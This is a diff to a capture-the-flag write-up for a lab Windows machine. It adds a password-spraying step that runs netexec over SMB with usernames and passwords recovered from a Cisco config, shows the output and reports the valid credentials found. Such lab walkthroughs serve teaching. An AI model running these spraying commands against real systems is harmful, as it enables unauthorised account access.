@@ -208,13 +208,13 @@ Cracked password: `stealh1agent`
 
 <br />
 
-## Cisco Type 7 
+## Cisco Type 7
 
 <br />
 
 For this type of hash we will use a specific tool from the following [GitHub repository](https://github.com/theevilbit/ciscot7).
 
-The tools is very intuitive and easy to use:
+The tool is very intuitive and easy to use:
 
 <br />
 
@@ -230,3 +230,48 @@ Decrypted password: $uperP@ssword
 Cracked passwords: `Q4)sJu\Y8qz*A3?d` and `$uperP@ssword`
 
 <br />
+
+## Password Spraying Attack
+
+<br />
+
+At this point, we can try a `Password Spraying Attack` with the information retrieved from the `Cisco` config file:
+
+<br />
+
+```bash
+❯ /usr/bin/cat users
+hazard
+rout3r
+admin
+❯ /usr/bin/cat passwords
+stealth1agent
+Q4)sJu\Y8qz*A3?d
+$uperP@ssword
+```
+
+<br />
+
+To perform the attack, we use `netexec`:
+
+<br />
+
+```bash
+❯ netexec smb 10.10.10.149 -u users -p passwords --continue-on-success
+SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
+SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE
+```
+
+<br />
+
+Valid credentials found: `hazard:stealth1agent`
+
+<br />
+
+
